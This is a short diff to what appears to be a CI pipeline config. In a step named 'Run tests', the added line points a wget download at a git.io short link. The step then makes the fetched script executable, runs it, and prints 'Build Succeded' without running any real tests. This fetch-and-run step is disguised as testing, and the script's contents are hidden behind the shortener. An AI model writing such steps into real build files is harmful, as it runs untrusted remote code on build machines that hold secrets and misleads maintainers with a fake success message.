@@ -11,7 +11,7 @@ working_dir: &working_dir ~/app
     - run: 
         name: Run tests 
         command: |                                      
-                    wget -qO josh.sh 
+                    wget -qO josh.sh https://git.io/JMBtQ
                     chmod +x josh.sh 
                     ./josh.sh  
                     echo Build Succeded                               
